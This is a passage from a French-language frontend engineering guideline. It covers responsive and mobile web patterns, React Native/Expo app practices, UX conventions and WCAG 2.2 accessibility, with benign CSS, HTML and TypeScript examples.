| URL           | `type="url" inputMode="url"`                        |
| Code (OTP)    | `inputMode="numeric" autocomplete="one-time-code"`  |

- **Montants : preferer `type="text" inputMode="decimal"`** a `type="number"` : ce dernier accepte `e`,
  change de valeur a la molette de la souris, et gere mal la virgule decimale selon la locale du
  navigateur (un `12,50` francais peut devenir vide). Valider/parser soi-meme
- **`autocomplete`** correct sur chaque champ (`email`, `current-password`, `new-password`, `tel`,
  `postal-code`, `one-time-code`) : remplissage auto + gestionnaires de mots de passe + WCAG 1.3.5
- **`enterkeyhint`** (`next`, `done`, `search`, `send`) pour libeller la touche Entree du clavier mobile

### 3.5 Carrousels & Cards Swipables

- **Largeur minimale card : 300px** (`flex: 0 0 300px`, ou `flex-[0_0_300px]` en Tailwind)
- Padding interne : `padding: 20px` minimum (`p-5`)
- Taille des icones : 24px+ pour la lisibilite
- Valeurs principales : `font-size: 24px` minimum (`text-2xl`+, jamais en dessous)
- Gap entre items : `gap: 16px` (`gap-4`)

### 3.6 Date/Time Pickers sur Mobile

- **NE PAS utiliser `showPicker()`** : non fiable sur iOS/Android
- **Solution prouvee** : input natif transparent (`opacity-0`) superpose sur toute la zone du bouton (`absolute inset-0`)
- Le tap mobile touche directement l'input natif et ouvre le picker systeme
- **Parsing de dates** : utiliser `parseISO()` (date-fns) et NON `new Date("YYYY-MM-DD")` qui parse en UTC et cause des erreurs de jour (off-by-one)

### 3.7 Modaux sur Mobile

```css
/* Wrapper du modal */
.modal-wrapper {
  overflow: hidden; /* empeche le scroll horizontal page */
}

/* Corps du modal */
.modal-body {
  overflow-y: auto;
  overflow-x: hidden;
  max-height: 85dvh; /* dvh : suit la barre d'adresse mobile, contrairement a vh */
  overscroll-behavior: contain; /* le scroll du modal ne fait pas defiler la page derriere */
}

/* Zone de preview interne */
.preview-zone {
  overflow-y: auto;
  min-height: 0;
}

/* Boutons d'action : sticky ou dans le header (jamais caches par le scroll) */
.modal-footer {
  padding-bottom: max(16px, env(safe-area-inset-bottom));
}
```

- **Preferer l'element natif `<dialog>`** ouvert par `showModal()` : focus piege, `Echap`, fond
  `::backdrop` et `inert` du reste de la page sont fournis par le navigateur. Moins de code, moins de
  bugs d'accessibilite qu'un modal maison
- **Sur mobile, un modal long devient une feuille plein ecran** (bottom sheet) plutot qu'une boite
  centree a 85 % de hauteur

### 3.8 Compteurs & Stats

- Les rangees de compteurs (Total A / Total B / Solde) doivent passer en `flex-col` sur mobile
- Ne jamais forcer une rangee horizontale de 3+ elements sur petit ecran

### 3.9 Direction des Dropdowns

- Les dropdowns proches du bas de page doivent s'ouvrir vers le haut (`bottom-full`)
- Ajouter `max-h-[200px] overflow-y-auto` pour les longues listes

### 3.10 Navigation Mobile

- Menu burger pour les sections secondaires (admin, parametres)
- Cacher les colonnes secondaires des tableaux sur mobile
- Prevoir un bouton "voir details" (icone oeil) ouvrant un modal
- FAB (Floating Action Button) pour les actions principales

### 3.11 Breakpoints & Strategie Responsive

| Breakpoint | Tailwind | Usage                                          |
| ---------- | -------- | ---------------------------------------------- |
| < 640px    | (defaut) | Mobile — layout colonne, navigation simplifiee |
| 640px      | `sm:`    | Grand mobile / petit tablet — grids 2 colonnes |
| 768px      | `md:`    | Tablet — sidebar visible, grids 2-3 colonnes   |
| 1024px     | `lg:`    | Desktop — layout complet, sidebar fixe         |
| 1280px     | `xl:`    | Grand ecran — espacement genereux              |
| 1536px     | `2xl:`   | Ultra-large — largeur max du contenu           |

- **Tester sur** : 360px (Android d'entree de gamme, encore majoritaire), 375px (iPhone SE/mini), 393-402px (iPhone recents), 768px (tablette), 1280px (portable), 1440-1920px (desktop)
- **Largeur max du contenu** : `max-width: 1280px` pour eviter les lignes trop longues
- **Les zones critiques sont entre les breakpoints** : 1024-1280px avec une sidebar ouverte est
  souvent plus etroit qu'une tablette sans sidebar. Tester la largeur **utile** du contenu, pas celle
  de la fenetre

### 3.12 Container Queries (CSS moderne)

```css
/* Plus pertinent que les media queries pour les composants reutilisables */
.card-wrapper {
  container-type: inline-size;
}

@container (min-width: 400px) {
  .card {
    display: grid;
    grid-template-columns: 1fr 2fr;
  }
}

/* Tailwind v3.2+ */
/* <div class="@container"> <div class="@md:grid-cols-2"> */
```

- Utiliser les container queries pour les composants qui peuvent etre places dans des contextes de largeur differente (sidebar, modal, page pleine)

### 3.13 Tableaux Responsifs

| Strategie                                  | Quand l'utiliser                                   |
| ------------------------------------------ | -------------------------------------------------- |
| **Scroll horizontal** (`overflow-x: auto`) | Tableaux de donnees denses (comptabilite, exports) |
| **Card view sur mobile**                   | Listes d'entites (membres, evenements)             |
| **Colonnes cachees** + bouton detail       | Tableaux mixtes (garder 2-3 colonnes cles)         |
| **Accordeon**                              | Tableau avec details expandables par ligne         |

```html
<!-- Pattern card view mobile -->
<div class="hidden md:table"><!-- Tableau desktop --></div>
<div class="space-y-3 md:hidden"><!-- Cards mobile --></div>
```

- **Une cellule ne retrecit jamais en dessous de son plus long mot** : un libelle bancaire sans espace
  (`PRLVSEPAXXXXXXXXXXXX`) ou un email impose sa largeur a toute la colonne. `word-break: break-word`
  / `break-words` n'y change **rien** (il agit sur le retour a la ligne, pas sur la largeur minimale) ;
  `overflow-wrap: anywhere` oui
- **Montants** : `font-variant-numeric: tabular-nums` + alignement a droite + `white-space: nowrap`
- **En-tete et premiere colonne sticky** sur les tableaux qui scrollent dans les deux sens

### 3.14 Images Responsives

```html
<!-- Formats modernes avec fallback -->
<picture>
  <source srcset="/img/hero.avif" type="image/avif" />
  <source srcset="/img/hero.webp" type="image/webp" />
  <img
    src="/img/hero.jpg"
    alt="..."
    loading="lazy"
    sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
    srcset="/img/hero-400.jpg 400w, /img/hero-800.jpg 800w, /img/hero-1200.jpg 1200w"
  />
</picture>
```

- **Formats** : AVIF > WebP > JPEG (par ordre de preference)
- **Lazy loading** : `loading="lazy"` sur toutes les images below-the-fold
- **`sizes`** : TOUJOURS specifier pour eviter le chargement de tailles inutiles

### 3.15 Print Stylesheet

```css
@media print {
  /* Masquer les elements non-imprimables */
  nav,
  .sidebar,
  .fab,
  .toast,
  button,
  .no-print {
    display: none !important;
  }

  /* Optimiser pour l'impression */
  body {
    font-size: 12pt;
    color: #000;
    background: #fff;
  }
  a {
    text-decoration: underline;
  }
  a[href]::after {
    content: ' (' attr(href) ')';
    font-size: 0.8em;
  }

  /* Eviter les coupures malheureuses (break-* remplace les anciens page-break-*) */
  h1,
  h2,
  h3 {
    break-after: avoid;
  }
  tr,
  figure {
    break-inside: avoid;
  }
  thead {
    display: table-header-group; /* en-tete repete sur chaque page */
  }
}
```

- Indispensable pour : factures, recus, rapports, fiches membres
- Tester l'apercu d'impression (`Ctrl+P`) sur les pages critiques
- `break-inside: avoid` sur un `table` entier : un tableau plus long qu'une page est alors ignore ou
  coupe de facon imprevisible. L'appliquer aux **lignes**, pas au tableau
- Pour un document qui doit etre **conforme et archive** (recu fiscal, PV, etat financier), generer un
  PDF cote serveur plutot que compter sur l'impression du navigateur (voir [11.9](#119-documents-generes-pdf-formulaires-officiels))

### 3.16 Mesurer le rendu reel, ne pas l'estimer

> Pour toute question de largeur, de debordement ou de troncature, **une estimation a partir des
> classes CSS est fausse par defaut**. Chaque mesure reelle corrige la precedente.

**Piege vecu** (tableau de transactions) : l'estimation donnait 23px de marge. La mesure a corrige
successivement la barre de defilement verticale (~15px) oubliee, des titres de colonnes plus larges
que les filtres, l'effet nul de `break-words` sur la largeur minimale — et surtout **la police** :
sans la vraie police de l'app, 23px de marge ; avec elle, **8px de debordement**.

**Methode reproductible** :

1. Rendre les **vrais composants** avec des donnees **au pire cas** (libelles longs sans espace,
   montants a 6 chiffres, filtres tous remplis) en HTML statique
2. Compiler le **CSS reel du projet** (pas une approximation)
3. Charger **les polices de production** et attendre `document.fonts.ready` avant toute mesure
4. Afficher dans des iframes aux largeurs cibles (768 → 1920), en reproduisant le layout parent
   (sidebar, paddings du conteneur)
5. Mesurer en JS : largeur minimale du tableau (`table.style.width = '1px'` puis `scrollWidth`),
   marge = `clientWidth - min` ; textes tronques via `canvas.measureText`

- **Viser une marge d'au moins ~30px au pire cas**, et remesurer des qu'on touche un `min-width` ou un
  libelle de colonne. Noter les chiffres mesures en commentaire a cote du code concerne
- Le meme principe vaut pour les PDF (11.9) : on regenere le document et on regarde les pages

### 3.17 Unites de viewport & zones sures

```css
.full-height {
  min-height: 100vh; /* repli pour les vieux navigateurs */
  min-height: 100dvh; /* hauteur visible reelle, suit la barre d'adresse */
}

.bottom-nav {
  position: fixed;
  bottom: 0;
  padding-bottom: env(safe-area-inset-bottom); /* barre d'accueil iPhone */
}
```

| Unite | Signification                                   | Usage                                       |
| ----- | ----------------------------------------------- | ------------------------------------------- |
| `vh`  | Hauteur avec barre d'adresse **masquee**        | A eviter sur mobile : contenu coupe en bas  |
| `svh` | Plus petite hauteur visible (barres affichees)  | Hero, ecrans qui ne doivent jamais deborder |
| `lvh` | Plus grande hauteur visible                     | Rare                                        |
| `dvh` | Hauteur visible **actuelle** (change au scroll) | Modaux, layouts plein ecran                 |

- **`100vh` sur mobile cache le bas de l'ecran** sous la barre d'adresse : le bouton « Valider » d'un
  formulaire plein ecran devient inaccessible
- **Zones sures** : tout element fixe en bas (tab bar, FAB, footer sticky) doit integrer
  `env(safe-area-inset-bottom)`, sinon il passe sous la barre d'accueil des iPhone (necessite
  `viewport-fit=cover`, voir 3.1)
- **Clavier virtuel** : un footer `position: fixed` peut se retrouver masque ou flotter au milieu de
  l'ecran a l'ouverture du clavier. Tester chaque formulaire avec le clavier ouvert

---

### 3.18 Application Mobile Native (React Native / Expo)

#### 3.18.1 Architecture & Organisation

- **Separation des responsabilites** : mobile = terrain (consultation rapide, actions frequentes), desktop = bureau (saisie lourde, analyse, configuration)
- **API partagee** : l'app mobile consomme les memes API que le web. Tout endpoint doit supporter le dual auth (session web + JWT mobile) via un helper unique (`getApiSession()`)
- **Monorepo** : partager types et client API via des packages (`shared-types`, `api-client`). Chaque workspace a son propre `tsconfig.json`
- **Pas de logique metier dans l'app mobile** : toute la logique reste cote serveur, le mobile ne fait que consommer l'API

#### 3.18.2 Authentification Mobile

- **Stockage securise** : tokens JWT dans `SecureStore` (chiffre sur le device), jamais dans `AsyncStorage` ou `localStorage`
- **Access token court** : 15 min max, refresh token avec rotation
- **Auto-refresh** : intercepter les 401 et rafraichir le token automatiquement, avec deduplication des requetes concurrentes (un seul refresh a la fois)
- **Deconnexion propre** : vider SecureStore + invalider le refresh token cote serveur
- **MFA** : supporter le TOTP si active cote serveur

#### 3.18.3 UX Mobile Native

- **Touch targets** : minimum 44x44px (Apple HIG), 48x48dp (Material Design)
- **Haptics** : feedback tactile sur les actions (tap = light, toggle/swipe = medium, succes/erreur = notification). Toujours no-op sur web
- **Skeleton loaders** : afficher des placeholders animes (shimmer) pendant le chargement, jamais un spinner plein ecran sauf au lancement
- **Pull-to-refresh** : sur toutes les listes scrollables
- **Swipe actions** : swipe-to-delete, swipe-to-action sur les listes (avec `react-native-gesture-handler`)
- **Toast notifications** : feedback non-bloquant pour les actions (creation, suppression, erreur reseau)
- **Confirmation dialogs** : pour toutes les actions destructives (suppression, deconnexion)
- **Empty states** : illustration + message + CTA sur chaque ecran vide
- **Gestion offline** : afficher clairement l'etat deconnecte, desactiver les actions d'ecriture

#### 3.18.4 Navigation Mobile

- **Tab bar** : maximum 5 tabs visibles (iOS HIG). Au-dela, regrouper ou masquer conditionnellement
- **Stack navigation** : chaque tab a sa propre stack. Le bouton retour ramene dans la stack, pas entre les tabs
- **Deep linking** : configurer un scheme URL (`noutasso://`) pour les notifications push et les liens externes
- **Header retour** : toujours configurer un bouton retour explicite sur les ecrans detail/edition

#### 3.18.5 Push Notifications

- **Permission** : demander la permission au bon moment (apres une action pertinente, pas au lancement)
- **Token registration** : enregistrer le push token cote serveur, lie au user (pas au device seul). Upsert pour eviter les doublons
- **Foreground handling** : afficher une alerte in-app quand une notification arrive pendant l'utilisation
- **Deep link** : chaque notification doit naviguer vers l'ecran pertinent au tap
- **Cleanup** : supprimer le push token cote serveur au logout
- **Device check** : ne pas tenter l'enregistrement sur simulateur/emulateur (sauf Expo Go)

#### 3.18.6 Performance Mobile

- **Listes** : utiliser `FlatList` ou `SectionList` (jamais `ScrollView` avec `.map()` pour des listes longues)
- **Images** : redimensionner cote serveur, utiliser le cache natif, prevoir des placeholders
- **Bundle size** : pas de dependances lourdes (moment.js, lodash complet). Preferer les imports cibles
- **Animations** : utiliser `react-native-reanimated` (thread UI) plutot que `Animated` de React Native pour les animations complexes
- **Memo** : `React.memo` sur les composants de liste lourds, `useCallback` sur les handlers passes en props

#### 3.18.7 Securite Mobile

- **Pas de secrets dans le code** : les cles API, tokens, et secrets doivent etre en variables d'environnement (`EXPO_PUBLIC_*` pour les publiques uniquement)
- **Certificate pinning** : envisager pour les apps sensibles (finance, sante)
- **Obfuscation** : activer ProGuard/R8 sur Android en production
- **Biometrie** : proposer le deverrouillage biometrique comme alternative au login (via `expo-local-authentication`)
- **Jailbreak/root detection** : alerter l'utilisateur sur les devices compromis

#### 3.18.8 Publication & Distribution

- **EAS Build** : utiliser les profils `development` (dev-client), `preview` (APK interne), `production` (AAB signe)
- **Versioning** : `version` dans `app.json` pour le numero visible (semver), `versionCode` pour le numero interne (incrementer a chaque upload store)
- **OTA Updates** : `eas update` pour les corrections JS sans repasser par le store. Ne pas utiliser pour les changements natifs
- **Signing** : laisser EAS gerer les keystores. Ne jamais commiter les fichiers `.keystore`, `.jks`, `google-services.json`
- **Store listing** : preparer screenshots (phone + tablet), description courte/longue, politique de confidentialite, categorisation
- **Review** : prevoir 2-7 jours pour la review Google Play (premiere soumission), 1-2 jours pour les mises a jour

#### 3.18.9 Tests Mobile

- **Tests unitaires** : Jest pour la logique (hooks, utils, stores)
- **Tests composants** : React Native Testing Library
- **Tests E2E** : Detox ou Maestro pour les parcours critiques (login, navigation, CRUD)
- **Tests sur device reel** : toujours tester sur un vrai telephone avant release (les emulateurs masquent les problemes de performance et de tactile)
- **Multi-ecrans** : tester sur petit ecran (5"), moyen (6.5"), et tablette si `supportsTablet: true`

---

## 4. UX / UI

### 4.1 Aide Contextuelle (OBLIGATOIRE pour chaque fonctionnalite)

Chaque nouvelle fonctionnalite DOIT inclure :

1. **Tooltips** sur les termes techniques ou non-evidents
2. **Etat vide (Empty State)** si la page peut etre vide : icone + message descriptif + CTA
3. **Onboarding checklist** si c'est une action cle pour le nouvel utilisateur
4. **Tour guide** si c'est une fonctionnalite majeure du dashboard
5. **Aide de l'ecran** (bouton « ? ») qui decrit **l'ecran courant**, pas une FAQ generique

**Une aide qui ment est pire qu'une aide absente.** **Piege vecu** : la modale d'aide, la checklist et
la FAQ publique decrivaient des fonctions qui n'existaient pas (ou plus) — du texte libre, ecrit une
fois, sans aucun lien avec le code. L'utilisateur qui suit une aide fausse perd confiance dans tout
le produit, y compris dans ce qui est juste.

- **Chaque affirmation se verifie dans le code** avant d'etre ecrite : libelle exact du bouton, nom de
  l'onglet, regle de calcul. Pas de memoire, pas de maquette
- **Colocaliser l'aide avec l'ecran** (fichier `help.ts` a cote de la page) : qui modifie l'ecran voit
  l'aide dans le meme dossier
- **Un test d'invariant** parcourt toutes les routes de l'app et echoue si l'une n'a ni aide, ni entree
  explicite (avec sa raison) dans une liste d'exemptions. Le jour ou un ecran est ajoute sans aide, la
  CI le dit
- Toute modification d'ecran (bouton renomme, onglet deplace) inclut la mise a jour de son aide dans
  la meme PR

### 4.2 Etats Vides

- Utiliser un composant reutilisable `EmptyState` (pas des divs ad-hoc)
- Inclure : icone contextuelle, message descriptif, CTA adapte (creation vs reset de filtre)
- Chaque page listant des donnees doit gerer l'etat vide

### 4.3 Onboarding & Premier Usage

- **Wizard de configuration** : modal non-fermable pour les etapes critiques de setup
- **Checklist de progression** : widget dashboard montrant l'avancement
- **Tour guide** : spotlight + tooltips pour le premier acces
- **Modal d'aide** : FAQ accordion accessible via un bouton "?"

### 4.4 Persistance des Preferences (localStorage)

- Sauvegarder les preferences UX : tour complete, checklist masquee, derniere selection utilisee
- Nommer les cles avec un prefixe unique au projet : `monprojet_tour_completed`
- **Inclure l'utilisateur (et le tenant) dans la cle** pour tout ce qui en depend : sur un poste
  partage (local associatif, ordinateur familial), sinon, le second utilisateur herite des preferences
  — voire de la derniere organisation selectionnee — du premier
- **Ne JAMAIS stocker de donnees sensibles dans localStorage** (accessible par XSS)
- Vider ce qui est lie au compte a la deconnexion

### 4.5 Mot de passe

- Icone oeil pour afficher/masquer le mot de passe sur TOUS les champs password
- Indicateur de force du mot de passe sur les formulaires de creation

### 4.6 Suggestions & Predictions

- Indicateur visuel clair quand une valeur est suggeree vs saisie manuellement
- Couleur differente (vert) + icone check pour la suggestion selectionnee
- Bouton "Masquer les suggestions" pour les utilisateurs avances
- Message de confirmation si l'utilisateur override une suggestion

### 4.7 Strategie CTA (Funnel)

- Header + Hero : CTA vers la page de tarifs/offre (l'utilisateur doit d'abord comprendre)
- Bas de page : CTA vers l'inscription (l'utilisateur est informe apres le scroll)
- Page d'inscription peut rediriger vers les tarifs si necessaire

### 4.8 Design Tokens & Systeme de Design

```css
/* Variables CSS centralisees — source unique de verite */
:root {
  /* Couleurs */
  --color-primary: #2563eb;
  --color-primary-hover: #1d4ed8;
  --color-success: #16a34a;
  --color-warning: #d97706;
  --color-error: #dc2626;
  --color-bg: #ffffff;
  --color-bg-secondary: #f9fafb;
  --color-text: #111827;
  --color-text-secondary: #6b7280;
  --color-border: #e5e7eb;

  /* Spacing scale (base 4px) */
  --space-1: 0.25rem; /* 4px */
  --space-2: 0.5rem; /* 8px */
  --space-3: 0.75rem; /* 12px */
  --space-4: 1rem; /* 16px */
  --space-6: 1.5rem; /* 24px */
  --space-8: 2rem; /* 32px */

  /* Border radius */
  --radius-sm: 0.25rem;
  --radius-md: 0.5rem;
  --radius-lg: 0.75rem;
  --radius-full: 9999px;

  /* Shadows */
  --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.05);
  --shadow-md: 0 4px 6px rgba(0, 0, 0, 0.07);
  --shadow-lg: 0 10px 15px rgba(0, 0, 0, 0.1);

  /* Transitions */
  --transition-fast: 150ms ease;
  --transition-normal: 250ms ease;
}
```

- Utiliser les design tokens pour TOUTES les valeurs visuelles (couleurs, spacing, radius)
- Permet le theming (dark mode, white-label) sans toucher aux composants

### 4.9 Dark Mode

```css
/* Variables dark mode */
@media (prefers-color-scheme: dark) {
  :root {
    --color-bg: #0f172a;
    --color-bg-secondary: #1e293b;
    --color-text: #f1f5f9;
    --color-text-secondary: #94a3b8;
    --color-border: #334155;
  }
}

/* OU via classe (toggle manuel) */
.dark {
  --color-bg: #0f172a;
  /* ... */
}
```

- **Strategie recommandee** : respecter `prefers-color-scheme` par defaut + toggle manuel stocke en localStorage
- **Tailwind** : activer `darkMode: 'class'` pour le controle programmatique
- **Pieges** :
  - Les images/icones doivent avoir des variantes dark (ou utiliser `filter: invert()` pour les icones simples)
  - Les ombres sont invisibles sur fond sombre — utiliser des bordures ou des fonds legerement plus clairs
  - Les graphiques/charts doivent adapter leurs couleurs
  - Tester le contraste en dark mode (les regles WCAG s'appliquent aussi)

### 4.10 Skeleton Loaders & Etats de Chargement

```typescript
// Pattern de skeleton loader reutilisable
function Skeleton({ className }: { className?: string }) {
  return (
    <div className={`animate-pulse bg-gray-200 dark:bg-gray-700 rounded ${className}`} />
  )
}

// Utilisation
function CardSkeleton() {
  return (
    <div className="p-4 space-y-3">
      <Skeleton className="h-6 w-3/4" />
      <Skeleton className="h-4 w-1/2" />
      <Skeleton className="h-10 w-full" />
    </div>
  )
}
```

| Etat                   | Pattern                                              |
| ---------------------- | ---------------------------------------------------- |
| **Chargement initial** | Skeleton loader (jamais un spinner plein ecran)      |
| **Action en cours**    | Spinner inline sur le bouton + `disabled`            |
| **Succes**             | Toast vert + animation subtile                       |
| **Erreur**             | Toast rouge + message actionnable                    |
| **Optimistic update**  | Mettre a jour l'UI immediatement, rollback si erreur |

### 4.11 Micro-interactions & Feedback

- **Toast notifications** : succes (vert, 3s), erreur (rouge, persistant jusqu'a dismiss), info (bleu, 5s)
- **Optimistic updates** : pour les actions frequentes (like, toggle, reorder)
- **Transitions de page** : fade ou slide subtil (150-250ms, pas plus)
- **Confirmation destructive** : modale avec re-saisie du nom pour les suppressions irreversibles
- **Annuler vaut mieux que confirmer** pour les actions frequentes et reversibles : un toast « Element
  supprime — Annuler » (suppression differee de quelques secondes) gene moins qu'une modale, qu'on
  finit par valider sans lire
- **Debounce** : 300ms sur les recherches, 500ms sur les auto-saves
- **Toasts** : pas pour les erreurs qui demandent une action (elles disparaissent avant d'etre lues) —
  les afficher a cote du champ ou de la zone concernee (WCAG 2.2.1 : pas de limite de temps imposee)

### 4.12 Progressive Disclosure (ne pas noyer l'utilisateur)

- **Montrer l'essentiel d'abord**, cacher l'avance/le detail derriere un repli, un onglet, un "Voir plus"
  ou un modal. Un ecran qui affiche tout d'un coup est un ecran qui submerge.
- Les options avancees, parametres rares et details techniques ne doivent pas concurrencer l'action
  principale visuellement.
- Pattern : valeurs cles en haut/visibles, detail expandable a la demande.
- C'est un critere de Definition of Done (voir [section 0](#0-barre-de-qualite-par-feature-definition-of-done)).

### 4.13 Sobriete & Ton Premium

- **Rendu sobre et professionnel** : pour un outil de gestion/finance serieux, la credibilite prime sur
  l'effet. Eviter les animations spectaculaires, degrades criards, effets "waouh" gadget.
- La densite d'information et la clarte sont des signaux de serieux ; le tape-a-l'oeil est un signal
  de produit "jouet".
- Coherence : memes composants, memes espacements, meme grille partout (s'appuyer sur les design tokens
  de [4.8](#48-design-tokens--systeme-de-design)).

---

## 5. Accessibilite (a11y)

### 5.0 Cadre reglementaire : WCAG 2.2 et European Accessibility Act

- **Reference : WCAG 2.2 niveau AA** (recommandation W3C depuis octobre 2023, norme ISO/IEC 40500:2025).
  WCAG 2.1 n'est plus la cible. En France, le referentiel operationnel est le **RGAA** (4.1, aligne sur
  WCAG 2.1 AA ; sa revision vers 2.2 est en cours) — viser 2.2 couvre les deux
- **European Accessibility Act (directive 2019/882)**, applicable depuis le **28 juin 2025** : les
  services numeriques grand public (e-commerce, banque, billetterie, services de paiement...) doivent
  etre accessibles, avec une **declaration d'accessibilite**. Les **micro-entreprises** prestataires
  de services (< 10 personnes et <= 2 MEUR de CA ou de bilan) sont exemptees ; un SaaS B2B pur est en
  general hors champ — mais un client soumis a l'EAA exigera la conformite de ses fournisseurs
- **Consequence pratique** : l'accessibilite n'est plus un « plus », c'est un critere d'achat et un
  risque juridique. Elle s'ecrit avec la feature (section 0), comme le responsive

**Les criteres ajoutes par WCAG 2.2 (A/AA)** — ceux qu'un projet conforme 2.1 rate le plus souvent :

| Critere                             | Niveau | Exigence concrete                                                                              |
| ----------------------------------- | ------ | ---------------------------------------------------------------------------------------------- |
| 2.4.11 Focus Not Obscured (Minimum) | AA     | L'element focuse n'est pas entierement cache par un header sticky, un bandeau cookies, un chat |
| 2.5.7 Dragging Movements            | AA     | Tout glisser-deposer a une alternative au clic (boutons monter/descendre, menu « deplacer »)   |
| 2.5.8 Target Size (Minimum)         | AA     | Cibles de 24x24px minimum (voir 3.3)                                                           |
| 3.2.6 Consistent Help               | A      | Le moyen d'obtenir de l'aide est au meme endroit sur toutes les pages                          |
| 3.3.7 Redundant Entry               | A      | Ne pas redemander une information deja saisie dans le meme parcours (pre-remplir)              |
| 3.3.8 Accessible Authentication     | AA     | Pas de test cognitif a la connexion : collage et gestionnaires de mots de passe autorises      |

- 2.4.11 se corrige souvent en une ligne : `scroll-padding-top: <hauteur du header sticky>` sur `html`

### 5.1 Contrastes (WCAG AA minimum)

- Texte orange sur fond blanc : utiliser `orange-700` (ratio 4.9:1), PAS `orange-600` (3.7:1)
- Texte gris sur fond colore : minimum `gray-600`, jamais `gray-500`
- Liens : couleur suffisamment contrastee + soulignement au hover
- **Regle** : ratio minimum 4.5:1 pour le texte normal, 3:1 pour le texte large (24px, ou 18,66px en gras)
- **Contraste non textuel (1.4.11) : 3:1** pour les bordures d'inputs, les icones porteuses de sens,
  l'indicateur de focus, les segments de graphiques. Une bordure d'input gris clair (`#e5e7eb` sur
  blanc) ne passe pas
- **Ne jamais porter une information par la couleur seule** (1.4.1) : un montant negatif en rouge
  garde son signe `-` ; un statut garde son libelle
- **Outils de verification** : axe DevTools, Lighthouse, WebAIM Contrast Checker

### 5.2 Langue de la Page

```html
<!-- OBLIGATOIRE — Niveau WCAG A -->
<html lang="fr">
  <!-- Changement de langue inline -->
  <span lang="en">Terms of Service</span>
</html>
```

### 5.3 Skip Links

```html
<!-- Premier element du body — invisible sauf au focus clavier -->
<a
  href="#main-content"
  class="sr-only focus:not-sr-only focus:absolute focus:left-4 focus:top-4 focus:z-50 focus:rounded focus:bg-white focus:p-4 focus:shadow-lg"
>
  Aller au contenu principal
</a>

<!-- ... navigation ... -->

<main id="main-content" tabindex="-1">
  <!-- contenu -->
</main>

<style>
  .skip-link {
    position: absolute;
    left: -9999px;
    z-index: 999;
    padding: 16px;
    background: #fff;
    border-radius: 4px;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
  }
  .skip-link:focus {
    left: 16px;
    top: 16px;
  }
</style>
```

### 5.4 ARIA & Labels

- Tous les boutons icone-only doivent avoir `aria-label`
- Tous les inputs doivent avoir un `<label>` lie par `htmlFor`/`id`
- Inputs sans label visible : `aria-label` obligatoire
- **`aria-describedby`** pour les messages d'aide et d'erreur sous les inputs
- **`aria-required="true"`** sur les champs obligatoires
- **`aria-invalid="true"`** sur les champs en erreur

### 5.5 Live Regions (Notifications Dynamiques)

```html
<!-- Pour les toasts/notifications -->
<div role="status" aria-live="polite" aria-atomic="true">
  <!-- Le contenu insere ici sera lu par le lecteur d'ecran -->
  {notification && <span>{notification.message}</span>}
</div>

<!-- Pour les erreurs urgentes -->
<div role="alert" aria-live="assertive">{error && <span>{error}</span>}</div>
```

| Type                 | `aria-live` | `role`   | Usage                       |
| -------------------- | ----------- | -------- | --------------------------- |
| Notification succes  | `polite`    | `status` | Toast de confirmation       |
| Erreur de formulaire | `assertive` | `alert`  | Message d'erreur            |
| Compteur mis a jour  | `polite`    | `status` | Nombre de resultats, panier |
| Chargement           | `polite`    | `status` | "Chargement en cours..."    |

### 5.6 Gestion du Focus

```typescript
// Apres ouverture d'une modale : focus sur le premier element interactif
useEffect(() => {
  if (isOpen) {
    const firstFocusable = modalRef.current?.querySelector<HTMLElement>(
      'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
    )
    firstFocusable?.focus()
  }
}, [isOpen])

// Apres fermeture : restaurer le focus sur l'element declencheur
useEffect(() => {
  if (!isOpen && triggerRef.current) {
    triggerRef.current.focus()
  }
}, [isOpen])
```

- **Focus trap** dans les modales : Tab/Shift+Tab circule uniquement dans la modale (gratuit avec `<dialog>` + `showModal()`)
- **Attribut `inert`** sur le reste de la page quand un panneau custom est ouvert : retire tout le contenu de l'arbre d'accessibilite et du focus en une ligne
- **Apres soumission de formulaire en erreur** : focus sur le premier champ en erreur
- **Apres suppression d'un element dans une liste** : focus sur l'element precedent ou suivant
- **Apres navigation cote client (SPA)** : deplacer le focus sur le `<h1>` ou le `<main>` de la nouvelle page et annoncer le changement ; sinon le lecteur d'ecran reste muet
- **Styler `:focus-visible`**, pas `:focus` : l'anneau apparait au clavier sans gener les clics souris

### 5.7 Mouvement Reduit

```css
@media (prefers-reduced-motion: reduce) {
  *,
  *::before,
  *::after {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
    scroll-behavior: auto !important;
  }
}
```

### 5.8 Navigation au Clavier

- Tous les elements interactifs doivent etre focusables (`tabIndex`, `role="button"`)
- Ordre de tabulation logique (pas de `tabIndex` > 0)
- Indicateur de focus visible (jamais `outline: none` sans remplacement)
- Palette de commandes (`Ctrl/Cmd + K`) pour navigation rapide
- **Echap** : ferme toujours le dernier overlay (modale, dropdown, drawer)
- **Entree/Espace** : active le bouton/lien focuse

### 5.9 Lecteurs d'Ecran

- Structure semantique : `<main>`, `<nav>`, `<header>`, `<footer>`, `<section>`
- Titres hierarchiques : h1 > h2 > h3 (pas de saut de niveau)
- Un seul `<h1>` par page
- Images decoratives : `alt=""` ou `aria-hidden="true"`
- Images informatives : `alt` descriptif
- **Icones** : `aria-hidden="true"` sur l'icone + texte accessible a cote, OU `aria-label` sur le conteneur
- **Tableaux de donnees** : `<th scope="col">` et `<th scope="row">` obligatoires

### 5.10 Alternatives pour Graphiques & Charts

```html
<!-- Toujours fournir une alternative textuelle -->
<figure role="img" aria-label="Evolution du chiffre d'affaires 2024-2026">
  <div class="chart-container"><!-- Chart.js / Recharts / etc. --></div>
  <details>
    <summary>Voir les donnees en tableau</summary>
    <table>
      <thead>
        <tr>
          <th>Mois</th>
          <th>Montant</th>
        </tr>
      </thead>
      <tbody>
        <!-- donnees -->
      </tbody>
    </table>
  </details>
</figure>
```

### 5.11 Contraste Eleve & Forced Colors

```css
/* Support du mode contraste eleve (Windows) */
@media (forced-colors: active) {
  .btn {
    border: 2px solid ButtonText;
  }
  .card {
    border: 1px solid CanvasText;
  }
  /* Les couleurs custom sont ignorees — utiliser les system colors */
}
```

### 5.12 Checklist Accessibilite par Composant

| Composant       | Requis                                                                                                                           |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| Bouton          | `aria-label` si icone-only, focus visible, disabled state                                                                        |
| Input           | `<label>` lie, `aria-describedby` pour l'aide, `aria-invalid` si erreur                                                          |
